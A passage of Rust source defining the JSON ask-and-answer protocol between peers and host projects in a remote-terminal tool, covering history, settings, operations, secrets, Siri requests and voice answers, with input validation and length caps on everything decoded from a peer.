//! A host project's history, settings, token optimization and operations, as
//! a peer asks for them ([`crate::wire::Message::ProjectAsk`]).
//!
//! An ask and its answer travel as JSON, so either side can add a field later
//! without breaking the other: a field a reader does not know is ignored, and
//! one it misses takes its default. Everything decoded here came from a peer:
//! one-line text is cleaned for display (see
//! [`crate::remote_terminals::display_text`]), longer text keeps its lines but
//! loses other control and bidirectional characters, and every list is capped.

use connecto_core::functional_memory::{self as fm, FmFile, FmFiles, FmModel, FmState, FmStatus};
use connecto_core::ops::{HookMode, OpRow, OpStanding, OpStats, OpsAction, OpsView};
use connecto_core::tokens::{
    After, Before, CompactEstimate, Confirmation, Loaded, ProjectTokenView, Proposal, ProposalKind,
    StudyFinding, StudyState, TokenReport, TokenSettings, Totals,
};
use connecto_core::{
    ConfigMode, HistoryEntry, InstallState, InstalledPackage, PackageItem, ProjectPackages,
    ProjectPackagesView, ProjectSettings, ProjectTools, RequirementState, RequirementView,
};
use serde_json::{Map, Value, json};

use crate::hosting::{tool_byte, tool_from_byte};

/// The most history entries one answer carries, newest first.
pub const MAX_HISTORY: usize = 500;
/// The most bytes of an answer (a transcript is kept up to 2 MiB).
pub const MAX_ANSWER: u64 = 4 * 1024 * 1024;
/// The most bytes of an ask.
pub const MAX_ASK: usize = 64 * 1024;
/// The most items of any one list in an answer.
const MAX_ITEMS: usize = 1000;
/// The longest one-line text kept from a peer.
const MAX_LINE: usize = 512;
/// The longest paragraph kept from a peer (a task, evidence, advice).
const MAX_PARAGRAPH: usize = 4096;

/// What a peer asks of one host project.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProjectAsk {
    /// The closed terminals, newest first.
    History,
    /// The saved transcript of one closed terminal.
    Transcript {
        history: String,
    },
    /// Open a closed terminal again (Continue).
    Continue {
        history: String,
    },
    /// The project's package settings and install status, with the host's
    /// packages to name them.
    Settings,
    SetSettings(ProjectSettings),
    /// A `set-settings` from a peer from before OpenCode: it names no
    /// `opencode_config`, so the project keeps the one it has when the write
    /// is applied (its `opencode_config` here is not used).
    SetSettingsBeforeOpenCode(ProjectSettings),
    /// A `set-settings` from a peer from before sets of tools (OpenCode's
    /// config named, no `tool_list`): its `tools` is one tool or all. When
    /// that is the word the project's own set writes, the peer did not change
    /// it and the project keeps its set. A peer from before OpenCode is from
    /// before sets of tools too, and is handled the same way.
    SetSettingsBeforeToolSets(ProjectSettings),
    /// Check the project's packages again.
    Refresh,
    /// Look again for the tools a package needs (ADR 0037).
    CheckRequirements {
        package: String,
    },
    /// Run the host's own install command for one tool a package needs, in
    /// a new shell terminal of the project. The command is never sent: the
    /// host takes it from its package.
    InstallRequirement {
        package: String,
        requirement: String,
        /// The command the person approved: the host runs its own, and only
        /// if it is still this text.
        command: String,
    },
    /// Agent Token Optimization: the project's state.
    Tokens,
    TokensAnalyze,
    TokensApply {
        plugins: Vec<String>,
        skills: Vec<String>,
    },
    TokensUndo,
    TokensAutocompact(Option<u32>),
    /// The project's operations in slug order, those after `after`, each
    /// with its two files whole, as many as one answer holds (see
    /// [`fetch_ops_view`]).
    Ops {
        after: Option<String>,
    },
    /// What the person asked of them, as the Operations list asks it here.
    OpsAct(OpsAction),
    /// The project's own secrets, without values, in name order after
    /// `after`, as many as one page holds (see
    /// [`crate::remote_secrets::fetch_secrets`]).
    Secrets {
        after: Option<String>,
    },
    /// A change to them, or an answer to a terminal's request for one.
    SecretsAct(crate::remote_secrets::SecretsAction),
    /// The project's functional memory (ADR 0033): its files, capped, and
    /// where its updates stand (see [`functional_memory_json`]).
    FunctionalMemory,
    /// Update it now; answered like [`ProjectAsk::FunctionalMemory`].
    FunctionalMemoryUpdate,
    /// Change its automatic switch or its model (`Some(None)`: back to the
    /// default), exactly one of them; answered like
    /// [`ProjectAsk::FunctionalMemory`].
    FunctionalMemorySet {
        auto: Option<bool>,
        model: Option<Option<FmModel>>,
    },
    /// A question asked by voice (Siri) for the project's app session,
    /// taken in charge by the host: typed once whatever the retries, its
    /// reply kept for a while and, with `notify`, pushed to the phone (see
    /// [`crate::siri`]).
    SiriAsk {
        /// The phone's id for it, the same on every retry.
        request_id: String,
        /// The app session's wire id, as the peer was sent it.
        terminal: u32,
        text: String,
        /// The agent's question it answers, exactly as the peer read it.
        question: Option<String>,
        notify: Option<crate::siri::SiriNotify>,
    },
    /// Where a Siri request stands, and its reply once there is one.
    SiriResult {
        request_id: String,
    },
    /// The phone has said the reply itself: no notification for it.
    SiriDelivered {
        request_id: String,
    },
    /// The phone's push destination, new or changed: open requests that
    /// went to `old_device_token` (or to the same token) go to `to` from now.
    PushRegister {
        old_device_token: Option<String>,
        to: crate::siri::SiriNotify,
    },
    /// The push token of a request's Live Activity, new or changed.
    ActivityToken {
        request_id: String,
        token: String,
    },
    /// How long the app session's current turn has run.
    SiriStatus {
        terminal: u32,
    },
    /// The questions the project's agent terminals ask now (permissions,
    /// menus, questions wanting words), for a voice call (see
    /// [`crate::voice_answers`]).
    Questions,
    /// Answer one of them: only while that terminal still shows that very
    /// question (`question` is its id). Never a tap-only choice.
    QuestionAnswer {
        /// The terminal's wire id, as [`ProjectAsk::Questions`] gave it.
        terminal: u32,
        question: String,
        /// The occurrence of the question that was read back, as
        /// [`ProjectAsk::Questions`] gave it.
        occurrence: String,
        choice: crate::voice_answers::AnswerChoice,
    },
    /// A call's prompt (a task to start, a question to analyse) for the
    /// app session with wire id `terminal`: typed only while it is between
    /// turns, shows no question, and its input line is empty (see
    /// [`crate::voice_answers::send_prompt`]).
    SendPrompt {
        terminal: u32,
        text: String,
    },
}

/// What a host that knows no such ask answers: one from before an ask was
/// added says this, so the window can tell the person to update it.
pub const UNKNOWN_ASK: &str = "not an ask this machine knows";

impl ProjectAsk {
    /// The action the host's guard records it as. Every ask passes the guard.
    #[must_use]
    pub const fn action(&self) -> &'static str {
        match self {
            Self::History => "project-history",
            Self::Transcript { .. } => "project-transcript",
            Self::Continue { .. } => "project-continue",
            Self::Settings => "project-settings",
            Self::SetSettings(_)
            | Self::SetSettingsBeforeOpenCode(_)
            | Self::SetSettingsBeforeToolSets(_) => "project-set-settings",
            Self::Refresh => "project-refresh",
            Self::CheckRequirements { .. } => "project-check-requirements",
            Self::InstallRequirement { .. } => "project-install-requirement",
            Self::Tokens => "project-tokens",
            Self::TokensAnalyze => "project-tokens-analyze",
            Self::TokensApply { .. } => "project-tokens-apply",
            Self::TokensUndo => "project-tokens-undo",
            Self::TokensAutocompact(_) => "project-tokens-autocompact",
            Self::Ops { .. } => "project-ops",
            Self::OpsAct(action) => match action {
                OpsAction::Approve { .. } => "project-ops-approve",
                OpsAction::Withdraw(_) => "project-ops-withdraw",
                OpsAction::Delete(_) => "project-ops-delete",
                OpsAction::SetIntercept(..) => "project-ops-intercept",
                OpsAction::Run { .. } => "project-ops-run",
                OpsAction::Fix(_) => "project-ops-fix",
                OpsAction::Discover => "project-ops-discover",
                OpsAction::Later => "project-ops-later",
                OpsAction::SetHook(_) => "project-ops-hook",
                OpsAction::SetWeekly(_) => "project-ops-weekly",
            },
            Self::Secrets { .. } => "project-secrets",
            Self::SecretsAct(action) => action.action(),
            Self::FunctionalMemory => "project-functional-memory",
            Self::FunctionalMemoryUpdate => "project-functional-memory-update",
            Self::FunctionalMemorySet { .. } => "project-functional-memory-set",
            Self::SiriAsk { .. } => "siri-ask",
            Self::SiriResult { .. } => "siri-result",
            Self::SiriDelivered { .. } => "siri-delivered",
            Self::PushRegister { .. } => "push-register",
            Self::ActivityToken { .. } => "activity-token",
            Self::SiriStatus { .. } => "siri-status",
            Self::Questions => "project-questions",
            Self::QuestionAnswer { .. } => "project-question-answer",
            Self::SendPrompt { .. } => "project-send-prompt",
        }
    }

    /// What the guard records the ask as touching: the project, and the
    /// operation when it names one (`<project>/<slug>`).
    #[must_use]
    pub fn audited(&self, project: &str) -> String {
        let slug = match self {
            Self::OpsAct(
                OpsAction::Approve { slug, .. }
                | OpsAction::Withdraw(slug)
                | OpsAction::Delete(slug)
                | OpsAction::SetIntercept(slug, _)
                | OpsAction::Run { slug, .. }
                | OpsAction::Fix(slug),
            ) => Some(slug),
            // The secret's name or the request's number; never a value.
            Self::SecretsAct(action) => return format!("{project}/{}", action.audited()),
            // The terminal answered; never the words.
            Self::QuestionAnswer { terminal, .. } | Self::SendPrompt { terminal, .. } => {
                return format!("{project}/{terminal}");
            }
            _ => None,
        };
        slug.map_or_else(|| project.to_owned(), |slug| format!("{project}/{slug}"))
    }

    /// Whether it changes something on the host (and so is worth asking for
    /// the view again after it).
    #[must_use]
    pub const fn changes(&self) -> bool {
        !matches!(
            self,
            Self::History
                | Self::Transcript { .. }
                | Self::Settings
                | Self::Tokens
                | Self::Ops { .. }
                | Self::Secrets { .. }
                | Self::FunctionalMemory
                | Self::SiriResult { .. }
                | Self::SiriStatus { .. }
                | Self::Questions
        )
    }

    #[must_use]
    pub fn encode(&self) -> Vec<u8> {
        let value = match self {
            Self::History => json!({ "ask": "history" }),
            Self::Transcript { history } => json!({ "ask": "transcript", "history": history }),
            Self::Continue { history } => json!({ "ask": "continue", "history": history }),
            Self::Settings => json!({ "ask": "settings" }),
            Self::SetSettings(settings) => {
                json!({ "ask": "set-settings", "settings": settings_json(settings) })
            }
            // As such a peer sends it: without OpenCode's config or the set
            // of tools.
            Self::SetSettingsBeforeOpenCode(settings) => {
                let mut fields = settings_json(settings);
                if let Some(fields) = fields.as_object_mut() {
                    fields.remove("opencode_config");
                    fields.remove("tool_list");
                }
                json!({ "ask": "set-settings", "settings": fields })
            }
            // As such a peer sends it: without the set of tools.
            Self::SetSettingsBeforeToolSets(settings) => {
                let mut fields = settings_json(settings);
                if let Some(fields) = fields.as_object_mut() {
                    fields.remove("tool_list");
                }
                json!({ "ask": "set-settings", "settings": fields })
            }
            Self::Refresh => json!({ "ask": "refresh" }),
            Self::CheckRequirements { package } => {
                json!({ "ask": "check-requirements", "package": package })
            }
            Self::InstallRequirement {
                package,
                requirement,
                command,
            } => json!({
                "ask": "install-requirement",
                "package": package,
                "requirement": requirement,
                "command": command,
            }),
            Self::Tokens => json!({ "ask": "tokens" }),
            Self::TokensAnalyze => json!({ "ask": "tokens-analyze" }),
            Self::TokensApply { plugins, skills } => {
                json!({ "ask": "tokens-apply", "plugins": plugins, "skills": skills })
            }
            Self::TokensUndo => json!({ "ask": "tokens-undo" }),
            Self::TokensAutocompact(tokens) => {
                json!({ "ask": "tokens-autocompact", "tokens": tokens })
            }
            Self::Ops { after } => json!({ "ask": "ops", "after": after }),
            Self::OpsAct(action) => json!({ "ask": "ops-act", "action": ops_action_json(action) }),
            Self::Secrets { after } => json!({ "ask": "secrets", "after": after }),
            Self::SecretsAct(action) => json!({ "ask": "secrets-act", "action": action.to_json() }),
            Self::FunctionalMemory => json!({ "ask": "functional-memory" }),
            Self::FunctionalMemoryUpdate => json!({ "ask": "functional-memory-update" }),
            Self::FunctionalMemorySet { auto, model } => {
                let mut ask = json!({ "ask": "functional-memory-set" });
                if let Some(auto) = auto {
                    ask["auto"] = json!(auto);
                }
                if let Some(model) = model {
                    ask["model"] = model.as_ref().map_or(Value::Null, fm_model_json);
                }
                ask
            }
            Self::SiriAsk {
                request_id,
                terminal,
                text,
                question,
                notify,
            } => json!({
                "ask": "siri-ask",
                "request_id": request_id,
                "terminal": terminal,
                "text": text,
                "question": question,
                "notify": notify.as_ref().map(crate::siri::SiriNotify::to_json),
            }),
            Self::SiriResult { request_id } => {
                json!({ "ask": "siri-result", "request_id": request_id })
            }
            Self::SiriDelivered { request_id } => {
                json!({ "ask": "siri-delivered", "request_id": request_id })
            }
            Self::PushRegister {
                old_device_token,
                to,
            } => {
                let mut ask = to.to_json();
                ask["ask"] = json!("push-register");
                ask["old_device_token"] = json!(old_device_token);
                ask
            }
            Self::ActivityToken { request_id, token } => {
                json!({ "ask": "activity-token", "request_id": request_id, "token": token })
            }
            Self::SiriStatus { terminal } => json!({ "ask": "siri-status", "terminal": terminal }),
            Self::Questions => json!({ "ask": "questions" }),
            Self::SendPrompt { terminal, text } => {
                json!({ "ask": "send-prompt", "terminal": terminal, "text": text })
            }
            Self::QuestionAnswer {
                terminal,
                question,
                occurrence,
                choice,
            } => {
                let mut ask = json!({
                    "ask": "question-answer",
                    "terminal": terminal,
                    "question": question,
                    "occurrence": occurrence,
                });
                match choice {
                    crate::voice_answers::AnswerChoice::Option(n) => ask["option"] = json!(n),
                    crate::voice_answers::AnswerChoice::Text(text) => ask["text"] = json!(text),
                }
                ask
            }
        };
        value.to_string().into_bytes()
    }

    /// # Errors
    /// When the bytes are not an ask this side knows.
    pub fn decode(bytes: &[u8]) -> Result<Self, String> {
        let bad = || UNKNOWN_ASK.to_owned();
        if bytes.len() > MAX_ASK {
            return Err(bad());
        }
        let v: Value = serde_json::from_slice(bytes).map_err(|_| bad())?;
        let history = || {
            v.get("history")
                .and_then(Value::as_str)
                .filter(|h| !h.is_empty() && h.len() <= MAX_LINE)
                .map(str::to_owned)
                .ok_or_else(bad)
        };
        // A package or tool id, as the host matches it exactly.
        let id_of = |key: &str| {
            v.get(key)
                .and_then(Value::as_str)
                .filter(|id| {
                    !id.is_empty()
                        && id.len() <= MAX_LINE
                        && id
                            .chars()
                            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
                })
                .map(str::to_owned)
                .ok_or_else(bad)
        };
        Ok(
            match v.get("ask").and_then(Value::as_str).ok_or_else(bad)? {
                "history" => Self::History,
                "transcript" => Self::Transcript {
                    history: history()?,
                },
                "continue" => Self::Continue {
                    history: history()?,
                },
                "settings" => Self::Settings,
                "set-settings" => {
                    let fields = v.get("settings");
                    let settings = fields.and_then(settings_from).ok_or_else(bad)?;
                    if fields.is_some_and(|f| f.get("opencode_config").is_none()) {
                        Self::SetSettingsBeforeOpenCode(settings)
                    } else if fields.is_some_and(|f| f.get("tool_list").is_none()) {
                        Self::SetSettingsBeforeToolSets(settings)
                    } else {
                        Self::SetSettings(settings)
                    }
                }
                "refresh" => Self::Refresh,
                "check-requirements" => Self::CheckRequirements {
                    package: id_of("package")?,
                },
                "install-requirement" => Self::InstallRequirement {
                    package: id_of("package")?,
                    requirement: id_of("requirement")?,
                    command: exact_command(&v, "command").ok_or_else(bad)?,
                },
                "tokens" => Self::Tokens,
                "tokens-analyze" => Self::TokensAnalyze,
                "tokens-apply" => Self::TokensApply {
                    plugins: strict_strings(v.get("plugins")).ok_or_else(bad)?,
                    skills: strict_strings(v.get("skills")).ok_or_else(bad)?,
                },
                "tokens-undo" => Self::TokensUndo,
                // Claude's default (`null`) or one of the choices the window
                // offers; anything else is refused, never read as the default.
                "tokens-autocompact" => Self::TokensAutocompact(match v.get("tokens") {
                    Some(Value::Null) => None,
                    Some(n) => Some(
                        n.as_u64()
                            .and_then(|n| u32::try_from(n).ok())
                            .filter(|n| connecto_core::tokens::AUTOCOMPACT_CHOICES.contains(n))
                            .ok_or_else(bad)?,
                    ),
                    None => return Err(bad()),
                }),
                "ops" => Self::Ops {
                    after: match v.get("after") {
                        None | Some(Value::Null) => None,
                        Some(slug) => Some(
                            slug.as_str()
                                .filter(|slug| connecto_ops::spec::valid_slug(slug))
                                .ok_or_else(bad)?
                                .to_owned(),
                        ),
                    },
                },
                "ops-act" => Self::OpsAct(
                    v.get("action")
                        .and_then(ops_action_from)
                        .ok_or_else(|| "not an operation action this machine knows".to_owned())?,
                ),
                "secrets" => Self::Secrets {
                    after: match v.get("after") {
                        None | Some(Value::Null) => None,
                        Some(name) => Some(
                            name.as_str()
                                .filter(|n| connecto_core::vault::check_name(n).is_ok())
                                .ok_or_else(bad)?
                                .to_owned(),
                        ),
                    },
                },
                // Never quoted back: it may hold a value.
                "secrets-act" => Self::SecretsAct(
                    v.get("action")
                        .and_then(crate::remote_secrets::SecretsAction::from_json)
                        .ok_or_else(|| "not a change to secrets this machine takes".to_owned())?,
                ),
                "functional-memory" => Self::FunctionalMemory,
                "functional-memory-update" => Self::FunctionalMemoryUpdate,
                // One change at a time: a refused one never leaves the
                // other made.
                "functional-memory-set" => match (v.get("auto"), v.get("model")) {
                    (Some(on), None) => Self::FunctionalMemorySet {
                        auto: Some(on.as_bool().ok_or_else(bad)?),
                        model: None,
                    },
                    (None, Some(Value::Null)) => Self::FunctionalMemorySet {
                        auto: None,
                        model: Some(None),
                    },
                    (None, Some(m)) => Self::FunctionalMemorySet {
                        auto: None,
                        model: Some(Some(fm_model_from(m).ok_or_else(bad)?)),
                    },
                    _ => return Err(bad()),
                },
                "siri-ask" | "siri-result" | "siri-delivered" | "push-register"
                | "activity-token" | "siri-status" => {
                    crate::siri::decode_ask(&v).ok_or_else(|| crate::siri::MALFORMED.to_owned())?
                }
                "questions" => Self::Questions,
                "send-prompt" => Self::SendPrompt {
                    terminal: v
                        .get("terminal")
                        .and_then(Value::as_u64)
                        .and_then(|n| u32::try_from(n).ok())
                        .ok_or_else(bad)?,
                    text: v
                        .get("text")
                        .and_then(Value::as_str)
                        .filter(|t| t.len() <= crate::voice_answers::MAX_PROMPT)
                        .ok_or_else(bad)?
                        .to_owned(),
                },
                "question-answer" => {
                    let line = |key: &str| {
                        v.get(key)
                            .and_then(Value::as_str)
                            .filter(|s| !s.is_empty() && s.len() <= MAX_LINE)
                            .map(str::to_owned)
                            .ok_or_else(bad)
                    };
                    let terminal = v
                        .get("terminal")
                        .and_then(Value::as_u64)
                        .and_then(|n| u32::try_from(n).ok())
                        .ok_or_else(bad)?;
                    let choice = match (v.get("option"), v.get("text")) {
                        (Some(n), None) => crate::voice_answers::AnswerChoice::Option(
                            n.as_u64()
                                .and_then(|n| usize::try_from(n).ok())
                                .filter(|n| *n < 100)
                                .ok_or_else(bad)?,
                        ),
                        (None, Some(t)) => crate::voice_answers::AnswerChoice::Text(
                            t.as_str()
                                .filter(|t| t.len() <= crate::voice_answers::MAX_TEXT)
                                .ok_or_else(bad)?
                                .to_owned(),
                        ),
                        _ => return Err(bad()),
                    };
                    Self::QuestionAnswer {
                        terminal,
                        question: line("question")?,
                        occurrence: line("occurrence")?,
                        choice,
                    }
                }
                _ => return Err(bad()),
            },
        )
    }
}

/// A project's functional memory as a host answers it: `{"files": [{"path",
/// "text"}], "truncated", "status": {"state", "commit", "updatedMs",
/// "message", "auto"}}`. The phone's call reads it as is (ADR 0033).
#[must_use]
pub fn functional_memory_json(files: &FmFiles, status: &FmStatus) -> Vec<u8> {
    let files_truncated = files.truncated;
    let files: Vec<Value> = files
        .files
        .iter()
        .map(|f| json!({ "path": f.path, "text": f.text }))
        .collect();
    json!({
        "files": files,
        "truncated": files_truncated,
        "status": {
            "state": status.state.name(),
            "commit": status.commit,
            "updatedMs": status.updated_ms,
            "message": status.message,
            "auto": status.auto,
            "model": status.model.as_ref().map(fm_model_json),
            "chosen": status.chosen.as_ref().map(fm_model_json),
            "modelsKnown": status.models_known,
            "models": status.models.iter().map(fm_model_json).collect::<Vec<_>>(),
        },
    })
    .to_string()
    .into_bytes()
}

/// A host's [`functional_memory_json`], as a peer reads it: every name
/// checked, text cleaned, and the same caps applied again (a peer never
/// trusts the host's).
///
/// # Errors
/// When the bytes are not such an answer.
pub fn functional_memory_from(bytes: &[u8]) -> Result<(FmFiles, FmStatus), String> {
    let v: Value = serde_json::from_slice(bytes)
        .map_err(|_| "that machine's functional memory could not be read".to_owned())?;
    let mut files = FmFiles {
        files: Vec::new(),
        truncated: v.get("truncated").and_then(Value::as_bool).unwrap_or(false),
    };
    let mut total = 0;
    for f in v
        .get("files")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        let path = f.get("path").and_then(Value::as_str).unwrap_or("");
        let Some(text) = f.get("text").and_then(Value::as_str) else {
            continue;
        };
        if !(fm::valid_doc_name(path) || path == fm::STATE_FILE) {
            files.truncated = true;
            continue;
        }
        let mut text = clean_text(text);
        if text.len() > fm::MAX_FILE_BYTES {
            let mut at = fm::MAX_FILE_BYTES;
            while !text.is_char_boundary(at) {
                at -= 1;
            }
            text.truncate(at);
            files.truncated = true;
        }
        if files.files.len() >= fm::MAX_FILES || total + text.len() > fm::MAX_TOTAL_BYTES {
            files.truncated = true;
            continue;
        }
        total += text.len();
        files.files.push(FmFile {
            path: path.to_owned(),
            text,
        });
    }
    let st = v.get("status").cloned().unwrap_or(Value::Null);
    let status = FmStatus {
        state: st
            .get("state")
            .and_then(Value::as_str)
            .and_then(FmState::from_name)
            .unwrap_or_default(),
        commit: opt_s(&st, "commit")
            .filter(|c| c.len() <= 64 && c.chars().all(|c| c.is_ascii_hexdigit())),
        updated_ms: st.get("updatedMs").and_then(Value::as_u64),
        message: opt_s(&st, "message"),
        auto: st.get("auto").and_then(Value::as_bool).unwrap_or(true),
        model: st.get("model").and_then(fm_model_from),
        chosen: st.get("chosen").and_then(fm_model_from),
        models_known: st
            .get("modelsKnown")
            .and_then(Value::as_bool)
            .unwrap_or(false),
        // A host from before the choice sends no `modelsKnown`.
        model_choice: st.get("modelsKnown").is_some_and(Value::is_boolean),
        models: st
            .get("models")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .take(MAX_ITEMS)
            .filter_map(fm_model_from)
            .collect(),
    };
    Ok((files, status))
}

fn fm_model_json(model: &FmModel) -> Value {
    json!({ "provider": model.provider.word(), "model": model.model })
}

/// A model named by a peer: a known CLI and a plain model word, never a
/// flag.
fn fm_model_from(v: &Value) -> Option<FmModel> {
    let provider = connecto_core::memory::Provider::from_word(v.get("provider")?.as_str()?)?;
    Some(FmModel::new(provider, v.get("model")?.as_str()?)).filter(FmModel::is_valid)
}

/// The host's packages, as the project's settings name them.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SettingsAnswer {
    pub packages: Vec<PackageItem>,
    pub default_package: Option<String>,
    /// `None` while the host has not loaded the project's settings yet.
    pub project: Option<ProjectPackagesView>,
    pub last_error: Option<String>,
    /// The host is from before sets of tools: its project's settings came
    /// without `tool_list`, so it saves one tool or all.
    pub tools_one_or_all: bool,
}

/// The project's token optimization state on the host.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct TokensAnswer {
    pub available: bool,
    /// `None` while the host is still loading it.
    pub project: Option<ProjectTokenView>,
}

// ---- cleaning ----

/// One line of peer text, cleaned for display and cut to `max` characters.
fn line_of(raw: &str, max: usize) -> String {
    raw.chars()
        .map(|c| if c.is_control() || is_bidi(c) { ' ' } else { c })
        .take(max)
        .collect::<String>()
        .trim()
        .to_owned()
}

/// Longer peer text: its lines and tabs kept, other control and
/// bidirectional characters dropped.
#[must_use]
pub fn clean_text(raw: &str) -> String {
    raw.chars()
        .filter(|c| *c == '\n' || *c == '\t' || !(c.is_control() || is_bidi(*c)))
        .collect()
}

const fn is_bidi(c: char) -> bool {
    matches!(
        c,
        '\u{2028}'
            | '\u{2029}'
            | '\u{061c}'
            | '\u{200e}'
            | '\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2066}'..='\u{2069}'
    )
}

// ---- reading JSON from a peer ----

fn s(v: &Value, key: &str) -> String {
    line_of(v.get(key).and_then(Value::as_str).unwrap_or(""), MAX_LINE)
}

fn opt_s(v: &Value, key: &str) -> Option<String> {
    v.get(key)
        .and_then(Value::as_str)
        .map(|t| line_of(t, MAX_LINE))
        .filter(|t| !t.is_empty())
}

fn para(v: &Value, key: &str) -> Option<String> {
    v.get(key)
        .and_then(Value::as_str)
        .map(|t| {
            clean_text(t)
                .chars()
                .take(MAX_PARAGRAPH)
                .collect::<String>()
        })
        .filter(|t| !t.trim().is_empty())
}

fn u(v: &Value, key: &str) -> u64 {
    v.get(key).and_then(Value::as_u64).unwrap_or(0)
}

fn opt_u(v: &Value, key: &str) -> Option<u64> {
    v.get(key).and_then(Value::as_u64)
}

fn n(v: &Value, key: &str) -> usize {
    usize::try_from(u(v, key)).unwrap_or(usize::MAX)
}

fn u32_of(v: &Value, key: &str) -> u32 {
    u32::try_from(u(v, key)).unwrap_or(u32::MAX)
}

fn f(v: &Value, key: &str) -> f64 {
    v.get(key)
        .and_then(Value::as_f64)
        .filter(|x| x.is_finite())
        .unwrap_or(0.0)
}

fn b(v: &Value, key: &str) -> bool {
    v.get(key).and_then(Value::as_bool).unwrap_or(false)
}

fn list<'a>(v: &'a Value, key: &str) -> impl Iterator<Item = &'a Value> {
    v.get(key)
        .and_then(Value::as_array)
        .map_or(&[][..], Vec::as_slice)
        .iter()
        .take(MAX_ITEMS)
}

/// Strings of a list, cleaned for display.
fn strings(v: &Value, key: &str) -> Vec<String> {
    list(v, key)
        .filter_map(Value::as_str)
        .map(|t| line_of(t, MAX_LINE))
        .collect()
}

/// Strings of a list as sent (ids the host matches exactly), with any that
/// could not be one dropped.
fn raw_strings(v: Option<&Value>) -> Vec<String> {
    v.and_then(Value::as_array)
        .map_or(&[][..], Vec::as_slice)
        .iter()
        .take(MAX_ITEMS)
        .filter_map(Value::as_str)
        .filter(|t| !t.is_empty() && t.len() <= MAX_LINE && !t.chars().any(char::is_control))
        .map(str::to_owned)
        .collect()
}

/// A list of ids from a peer, all of it or nothing: `None` when it is not
/// a list, too long, or holds anything that cannot be an id.
fn strict_strings(v: Option<&Value>) -> Option<Vec<String>> {
    let items = v?.as_array()?;
    if items.len() > MAX_ITEMS {
        return None;
    }
    items
        .iter()
        .map(|item| {
            item.as_str()
                .filter(|t| {
                    !t.is_empty() && t.len() <= MAX_LINE && !t.chars().any(char::is_control)
                })
                .map(str::to_owned)
        })
        .collect()
}

fn object(map: Map<String, Value>) -> Value {
    Value::Object(map)
}

// ---- history ----

#[must_use]
pub fn history_json(entries: &[HistoryEntry]) -> Vec<u8> {
    let entries: Vec<Value> = entries
        .iter()
        .take(MAX_HISTORY)
        .map(|e| {
            json!({
                "id": e.id,
                "terminal_id": e.terminal_id,
                "name": e.name,
                "tool": tool_byte(e.tool),
                "parent": e.parent,
                "closed_at_ms": e.closed_at_ms,
                "task": e.task,
                "last_reply": e.last_reply,
                "resumable": e.resumable,
            })
        })
        .collect();
    json!({ "entries": entries }).to_string().into_bytes()
}

/// # Errors
/// When the answer is not JSON.
pub fn history_from(bytes: &[u8]) -> Result<Vec<HistoryEntry>, String> {
    let v = parse(bytes)?;
    Ok(list(&v, "entries")
        .take(MAX_HISTORY)
        .filter_map(|e| {
            let id = s(e, "id");
            (!id.is_empty()).then(|| HistoryEntry {
                id,
                terminal_id: s(e, "terminal_id"),
                name: opt_s(e, "name"),
                tool: tool_from_byte(u8::try_from(u(e, "tool")).unwrap_or(0)),
                parent: opt_s(e, "parent"),
                closed_at_ms: u(e, "closed_at_ms"),
                task: para(e, "task"),
                last_reply: para(e, "last_reply"),
                resumable: b(e, "resumable"),
            })
        })
        .collect())
}

fn parse(bytes: &[u8]) -> Result<Value, String> {
    serde_json::from_slice(bytes).map_err(|_| "that machine's answer could not be read".to_owned())
}

#[must_use]
pub fn transcript_json(history: &str, text: &str) -> Vec<u8> {
    json!({ "history": history, "text": text })
        .to_string()
        .into_bytes()
}

/// The history id and the transcript text.
///
/// # Errors
/// When the answer is not JSON.
pub fn transcript_from(bytes: &[u8]) -> Result<(String, String), String> {
    let v = parse(bytes)?;
    Ok((
        s(&v, "history"),
        clean_text(v.get("text").and_then(Value::as_str).unwrap_or("")),
    ))
}

/// An answer with nothing in it, for a command done.
#[must_use]
pub fn done_json() -> Vec<u8> {
    b"{}".to_vec()
}

// ---- settings ----

fn settings_json(settings: &ProjectSettings) -> Value {
    json!({
        // What a peer from before sets of tools reads (one tool or `all`),
        // and the exact set.
        "tools": settings.tools.legacy_word(),
        "tool_list": settings.tools.words(),
        "claude_config": settings.claude_config.word(),
        "codex_config": settings.codex_config.word(),
        "pi_config": settings.pi_config.word(),
        "opencode_config": settings.opencode_config.word(),
        "use_default_package": settings.use_default_package,
        "packages": settings.packages,
    })
}

/// Settings from a peer: a word this side does not know is refused, never
/// read as another.
fn settings_from(v: &Value) -> Option<ProjectSettings> {
    let mode = |key: &str| ConfigMode::from_word(v.get(key)?.as_str()?);
    Some(ProjectSettings {
        // A peer from before sets of tools sends one tool or `all`.
        tools: match v.get("tool_list") {
            None => ProjectTools::from_word(v.get("tools")?.as_str()?)?,
            Some(list) => ProjectTools::from_words(strict_strings(Some(list))?.iter().map(String::as_str))?,
        },
        claude_config: mode("claude_config")?,
        codex_config: mode("codex_config")?,
        pi_config: mode("pi_config")?,
        // A peer from before OpenCode does not say: it keeps the default.
        opencode_config: match v.get("opencode_config") {
            None => ConfigMode::default(),
            Some(_) => mode("opencode_config")?,
        },
        use_default_package: v.get("use_default_package")?.as_bool()?,
        packages: strict_strings(v.get("packages"))?,
    })
}

fn install_state_json(state: &InstallState) -> Value {
    match state {
        InstallState::None => json!({ "state": "none" }),
        InstallState::Working => json!({ "state": "working" }),
        InstallState::UpToDate => json!({ "state": "up-to-date" }),
        InstallState::Updated => json!({ "state": "updated" }),
        InstallState::Error(why) => json!({ "state": "error", "why": why }),
    }
}

fn install_state_from(v: &Value) -> InstallState {
    match v.get("state").and_then(Value::as_str) {
        Some("working") => InstallState::Working,
        Some("up-to-date") => InstallState::UpToDate,
        Some("updated") => InstallState::Updated,
        Some("error") => InstallState::Error(s(v, "why")),
        _ => InstallState::None,
    }
}

fn requirement_json(r: &RequirementView) -> Value {
    let state = match &r.state {
        RequirementState::Checking => json!({ "state": "checking" }),
        RequirementState::Found { version } => json!({ "state": "found", "version": version }),
        RequirementState::Missing => json!({ "state": "missing" }),
        RequirementState::WrongVersion { version, wanted } => {
            json!({ "state": "wrong-version", "version": version, "wanted": wanted })
        }
        RequirementState::NoVersion { wanted } => {
            json!({ "state": "no-version", "wanted": wanted })
        }
    };
    json!({
        "id": r.id,
        "name": r.name,
        "why": r.why,
        "state": state,
        "install": r.install,
        "manual": r.manual,
        "url": r.url,
